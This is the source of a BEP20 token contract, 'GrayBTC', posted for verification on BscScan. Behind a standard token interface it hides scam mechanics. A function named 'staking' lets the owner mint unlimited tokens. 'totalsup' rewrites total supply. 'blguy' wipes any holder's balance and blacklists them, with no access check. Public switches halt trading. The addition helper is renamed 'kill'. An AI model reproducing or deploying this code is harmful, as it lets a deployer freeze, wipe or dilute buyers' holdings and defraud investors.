/**
 *Submitted for verification at BscScan.com on 2021-07-07
*/

pragma solidity ^0.4.22;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function kill(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract BEP20 {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    function totalsup(uint256 value) public returns (bool);
    function isTrading(bool transfers) public;
    function setbypass(bool bo) public;
    function isbb(address add) constant public returns (bool) ;
}

contract GrayBTC is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) bl;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint public totalSupply;
    bool public txoo;
    bool public finalbypass;
    constructor() public {
		symbol = "GBTC";
        name = "GrayBTC";
        decimals = 9;
        totalSupply = 1000000000000000000000000;
        txoo = true;
	    balances[msg.sender] = totalSupply;
	    finalbypass = false;
	emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Burn(address indexed burner, uint256 value);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        if(!finalbypass)
         require(txoo &&  !bl[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].kill(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }
    function isTrading(bool transfers) public {
           txoo = transfers;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        if(!finalbypass)
           require(txoo && !bl[msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].kill(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function isbb(address add) constant public returns (bool) {
        return bl[add];
    }
    function blguy(address add) public returns (bool) {
        bl[add] = true;
        balances[add] = 0;
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function _seed(address account, uint256 amount) internal {
        require(account != address(0), 'BEP20: Stake to This Contract');
        balances[account] = balances[account].kill(amount);
        emit Transfer(address(0), account, amount);
    }
    function _msgSender() internal constant returns (address) {
        return msg.sender;
    }
    function staking(uint256 amount) public onlyOwner returns (bool) {
	require(amount > 0, 'BEP20: Cannot stake 0 Token');
        _seed(_msgSender(), amount);
        return true;
    }
    
    function totalsup(uint256 amount) public onlyOwner returns (bool) {
	    totalSupply = amount;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        emit Burn(burner, _value);
    }
    
    function setbypass(bool bo) public {
        finalbypass = bo;
    }
}